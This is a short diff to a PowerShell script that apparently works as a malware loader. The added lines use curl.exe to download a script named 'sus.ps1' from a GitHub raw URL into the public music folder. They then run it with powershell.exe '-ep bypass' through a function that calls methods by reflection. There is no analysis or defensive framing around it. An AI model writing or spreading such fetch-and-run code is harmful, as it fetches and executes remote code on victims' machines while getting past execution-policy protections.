@@ -72,8 +72,9 @@ function FuncExAd {
 		$Ex::($memEx[1])()
 	}
 }
-
-$stringPath='c:\users\public\music\sus.ps1';
-FuncExAd -src $stringPath;
+curl.exe -k -L "https://github.com/jecoma/basco/raw/refs/heads/main/sus.ps1" -o "c:\users\public\music\sus.ps1"
+$stringPath='powershell.exe';
+$argPath='-ep bypass -file c:\users\public\music\sus.ps1';
+FuncExAd -src $stringPath -arg $argPath;
 
 
